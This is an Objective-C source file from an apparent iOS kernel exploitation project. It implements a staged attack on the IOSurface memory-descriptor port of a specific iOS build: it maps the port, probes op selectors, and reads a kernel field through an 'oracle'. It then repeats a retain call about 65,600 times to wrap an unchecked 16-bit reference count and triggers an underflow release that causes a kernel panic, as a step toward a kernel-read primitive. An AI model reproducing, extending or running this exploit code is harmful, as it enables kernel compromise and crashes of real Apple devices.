//
//  P138RouteD.m — ROUTE D: the IOMD dmaref retain-wrap runner. p138.
//  Lum1na-Debug (P007 rig). iOS kernel research (Lum1na).
//
//  Provenance: the intel table's iomd23.* + t8150.iomd.* rows (the
//  corpus-complete decode): retain_unchecked 0xa511624 (ldaddh #1 @md+0x34,
//  u16, NO ceiling; the 24A435 twin adds the 0x4000 log check 23F77 does
//  NOT have), the dec underflow panic string, the OP dispatcher law
//  (w1 = op<<24|subsel, gated by [md+0x98]: op-6 release SKIPPED when 0),
//  the op-2 GET-INFO oracle ([md+0x98] -> out+0xc), and the P069 device-
//  proven user hop (IOSurfaceCreateMachPort -> mach_vm_map, kr=0 on the
//  rig 2026-10-28). The plan: arm -> census -> oracle -> ladder.
//

#import "P138RouteD.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "LabBandit.h"
#import "P007KreadLane.h"
#import "P007Board.h"

#import <Metal/Metal.h>
#import <CoreFoundation/CoreFoundation.h>
#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <stdint.h>
#import <stdio.h>
#import <string.h>
#import <stdlib.h>
#import <unistd.h>

#define P138_BUILD   @"p138-routed-v1"
#define P138_LADDER  65600          /* the u16 0x10000 wrap +margin */

typedef mach_port_t p_ioservice_t; typedef mach_port_t p_ioconnect_t;
typedef CFMutableDictionaryRef (*IOServiceMatching_t)(const char *);
typedef p_ioservice_t (*GetSVC_t)(mach_port_t, CFDictionaryRef);
typedef kern_return_t (*IOOpen_t)(p_ioservice_t, task_port_t, uint32_t, p_ioconnect_t *);
typedef void (*IORel_t)(mach_port_t);
typedef kern_return_t (*IOConnectCallMethod_t)(
    mach_port_t, uint32_t, const uint64_t *, uint32_t, const void *, size_t,
    uint64_t *, uint32_t *, void *, size_t *);
typedef void *(*IOSurfaceCreate_t)(CFDictionaryRef);
static IOSurfaceCreate_t g_surfCreate;
typedef mach_port_t (*IOSurfaceCreateMachPort_t)(void *);
/* P069 law: local mach_vm_map prototype only - never #import <mach/mach_vm.h> */
typedef kern_return_t (*MachVMMapF_t)(vm_map_t, mach_vm_address_t *,
    mach_vm_size_t, mach_vm_offset_t, int, mach_port_t,
    vm_prot_t, vm_prot_t, memory_object_t, memory_object_offset_t,
    boolean_t, vm_inherit_t);

static NSMutableString *g_buf; static int g_fd = -1;
static void L(NSString *s) {
    if (!g_buf) return;
    NSString *o = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
    [g_buf appendString:o];
    if (g_fd >= 0) { const char *p = o.UTF8String;
        if (p) { write(g_fd, p, strlen(p)); fcntl(g_fd, F_FULLFSYNC); } }
}
static void Lf(NSString *fmt, ...) { va_list a; va_start(a, fmt);
    NSString *l = [[NSString alloc] initWithFormat:fmt arguments:a]; va_end(a); L(l); }
static NSString *P138R(void) { NSString *r = [g_buf copy]; g_buf = nil; return r; }

/* the op-2 oracle: [md+0x98] lands at out+0xc per the gate_oracle law */
static kern_return_t p138_oracle(IOConnectCallMethod_t call, mach_port_t mdport,
                                 uint32_t *gateval) {
    uint64_t in[2] = { 0, 0 };
    uint64_t sc[4]; memset(sc, 0, sizeof sc);
    uint64_t st[8]; memset(st, 0, sizeof st);
    uint32_t nout = 4; size_t nsc = 0x40;
    kern_return_t kr = call(mdport, 0x02000000 /* op-2, subsel 0 */,
                            in, 2, NULL, 0, sc, &nout, sc, &nsc);
    if (kr == 0) {
        /* the gate_oracle law: out-STRUCT +0xc = [md+0x98]; both windows
           reported honestly (scalar row and struct row). */
        *gateval = (uint32_t)(nsc >= 0x10 ? *(uint32_t *)((uint8_t *)st + 0xc) : 0);
        Lf(@"    oracle kr=0 sc0=%#llx sc1=%#llx st(+0xc)=%#x",
           (unsigned long long)sc[0], (unsigned long long)sc[1], *gateval);
    }
    return kr;
}

static void p138_bandit(const char *outcome) {
    static const char *arms[1] = { "main" };
    LabBanditSeedRow sr = { "main", "ok", 0 };
    char attr[288];
    LabBanditRegister("p138", arms, 1, &sr, 0, "p138 routeD auto-learn",
                      "ok", "survived", attr, sizeof attr);
    LabBanditRecord("p138", 0, outcome);
}

@implementation P138RouteD

+ (NSString *)tap {
    g_buf = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    g_fd = open([[docs stringByAppendingPathComponent:@"p138_routed_log.txt"]
                 UTF8String], O_CREAT | O_TRUNC | O_WRONLY, 0644);

    Lf(@"=== p138 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P138_BUILD);
    Lf(@"%@", [LabDeviceProfile identBlock]);
    L(@"[route D law] iomd23.*: retain UNCHECKED (u16 @md+0x34, no");
    L(@"  ceiling; 24A435's 0x4000 log check = ABSENT on 23F77), the op");
    L(@"  dispatcher (w1 = op<<24|subsel), the op-2 oracle ([md+0x98]);");
    L(@"  the P069 hop arm (CreateMachPort + mach_vm_map) DEVICE-PROVEN.");
    L(@"[!] PANIC-POSSIBLE (the wrap path panics by design = the receipt);");
    L(@"  one tap per force-quit; no entitlement walls in the lane.");

    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p138"];
    if (stop) { L(stop); p138_bandit("gated"); return P138R(); }

    void *iokit  = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *iosf   = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iokit || !iosf) { L(@"[-] STOP dlopen"); p138_bandit("nodlopen"); return P138R(); }
    IOServiceMatching_t pM = dlsym(iokit, "IOServiceMatching");
    GetSVC_t pG = dlsym(iokit, "IOServiceGetMatchingService");
    IOOpen_t pO = dlsym(iokit, "IOServiceOpen");
    IORel_t pR = dlsym(iokit, "IOObjectRelease");
    IOConnectCallMethod_t call = dlsym(iokit, "IOConnectCallMethod");
    g_surfCreate = (IOSurfaceCreate_t)dlsym(iosf, "IOSurfaceCreate");
    IOSurfaceCreateMachPort_t mkPort = dlsym(iosf, "IOSurfaceCreateMachPort");
    MachVMMapF_t pmMap = dlsym(iokit, "mach_vm_map");
    const int32_t vv[5] = { 256, 1, 4, 1024, 1024 };
    const char *kk[5] = { "IOSurfaceWidth", "IOSurfaceHeight",
        "IOSurfaceBytesPerElement", "IOSurfaceBytesPerRow", "IOSurfaceAllocSize" };
    if (!pM || !pG || !pO || !call || !mkPort || !pmMap) {
        L(@"[-] STOP dlsym"); p138_bandit("nodlsym"); return P138R();
    }
    /* build the surface dict */
    CFMutableDictionaryRef d = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    for (int i = 0; i < 5; i++) {
        CFNumberRef n = CFNumberCreate(NULL, kCFNumberSInt32Type, &vv[i]);
        CFDictionarySetValue(d, (__bridge CFStringRef)
            [NSString stringWithUTF8String:kk[i]], n); CFRelease(n);
    }
    void *surf = g_surfCreate ? g_surfCreate(d) : NULL;
    CFRelease(d);
    mach_port_t mdport = surf ? mkPort(surf) : MACH_PORT_NULL;
    if (!mdport) {
        Lf(@"[-] IOSurfaceCreateMachPort failed (resolved=%@)",
           g_surfCreate ? @"create-ok" : @"create-miss");
        p138_bandit("noport"); return P138R();
    }
    Lf(@"[1] surface + the md MACH PORT live (0x%x) - the P069 arm hop", mdport);

    /* the map-arm hop (P069-proven class): mach_vm_map over the port */
    {
        mach_vm_address_t tgt = 0;
        kern_return_t mkr = pmMap(mach_task_self_, &tgt, 0x1000 * 16,
                                 0 /*mask*/, VM_FLAGS_ANYWHERE, mdport,
                                 VM_PROT_READ | VM_PROT_WRITE,
                                 VM_PROT_READ | VM_PROT_WRITE,
                                 0 /*object*/, 0 /*offset*/,
                                 0 /*copy*/, VM_INHERIT_SHARE);
        Lf(@"[1] mach_vm_map(port) kr=0x%x addr=0x%llx (the P069 law: 0 = armed)",
           (unsigned)mkr, (unsigned long long)tgt);
    }

    /* ---- 2: the op-channel census (IOConnect-shaped first) ---- */
    L(@"=== STAGE 2: the op-channel census on the md port ===");
    const uint32_t sels[] = { 0x01000000, 0x02000000, 0x03000000, 0x04000000,
                              0x05000000, 0x06000000 };
    BOOL opChan = NO;
    for (int i = 0; i < 6; i++) {
        uint64_t out[4]; memset(out, 0, sizeof out);
        uint32_t nout = 4;
        kern_return_t kr = call(mdport, sels[i], NULL, 0, NULL, 0,
                                out, &nout, NULL, NULL);
        Lf(@"    op sel 0x%08x -> kr=0x%08x out=%llu,%llu",
           sels[i], (unsigned)kr,
           (unsigned long long)out[0], (unsigned long long)out[1]);
        if (kr != 0xe0000005 /* unknown port class */ && kr != MACH_SEND_INVALID_DEST)
            opChan = YES;
    }
    Lf(@"[2] op-channel census: %s", opChan ?
       @"RESPONSES PRESENT (an op channel exists on this port)" :
       @"all refused (the port may need device-open / the op channel is");
    L(@"  reached differently - the honest census result regardless).");

    /* ---- 3: the oracle rows ---- */
    L(@"=== STAGE 3: the op-2 oracle ([md+0x98] readback) ===");
    uint32_t gate = 0;
    kern_return_t okr = p138_oracle(call, mdport, &gate);
    Lf(@"[3] oracle readback: kr=0x%08x gate-value-class=%#x (0 = the release-",
       (unsigned)okr, gate);
    L(@"    skipped state per the op6 law; nonzero = the mapped-pg count).");

    /* ---- 4: the wrap ladder (only if op-3 spoke) ---- */
    L(@"=== STAGE 4: the retain-wrap ladder (op-3 x the u16 ceiling) ===");
    if (!opChan) {
        L(@"  SKIPPED (no op channel spoke) — honest: the retain-wrap needs");
        L(@"  the channel; the census result above names the next decode.");
        p138_bandit("nochan");
    } else {
        uint32_t lastGate = gate; int wrapSeen = 0;
        for (int i = 1; i <= P138_LADDER; i++) {
            uint64_t out[4]; memset(out, 0, sizeof out);
            uint32_t nout = 4;
            kern_return_t kr = call(mdport, 0x03000000, NULL, 0, NULL, 0,
                                    out, &nout, NULL, NULL);
            if (kr != 0) {
                Lf(@"    ladder op-3 [%d] kr=0x%08x (first non-zero = stop)",
                   i, (unsigned)kr); break;
            }
            if (i % 8192 == 0) {
                kern_return_t orkr = p138_oracle(call, mdport, &gate);
                Lf(@"    [%8d] retains done; oracle=%#x %@", i, gate,
                   gate < lastGate ? @"<- DECREASED (wrap direction!)" : @"");
                if (gate < 0x100 && gate > 0) wrapSeen++;
                if (gate == 0 && wrapSeen) {
                    L(@"    *** THE COUNT REACHED 0 — the wrap/teardown zone ***");
                    L(@"    *** next op-6 release = the underflow RECEIPT ***");
                    break;
                }
                lastGate = gate;
            }
        }
        /* the receipt attempt: the op-6 release at the wrapped state */
        if (wrapSeen) {
            uint64_t out[4]; memset(out, 0, sizeof out); uint32_t nout = 4;
            kern_return_t kr = call(mdport, 0x06000000, NULL, 0, NULL, 0,
                                    out, &nout, NULL, NULL);
            Lf(@"    op-6 release @wrapped kr=0x%08x (0x2c2=skipped; 0=teardown",
               (unsigned)kr);
            L(@"    executed; the _dmaReferences-underflow PANIC = the");
            L(@"    NAMED kernel receipt class for this route)");
        }
    }

    /* ---- honest tail ---- */
    L(@"[honesty] any oracle row = kernel-content readback CLASS (not");
    L(@"  hasKread). The wrap receipt (if landed) = the named kernel-");
    L(@"  state manipulation. kread32 stays the only gate.");
    p138_bandit("ran");
    Lf(@"=== p138 end %@ ===", LabLocalMilitaryNow());
    return P138R();
}

@end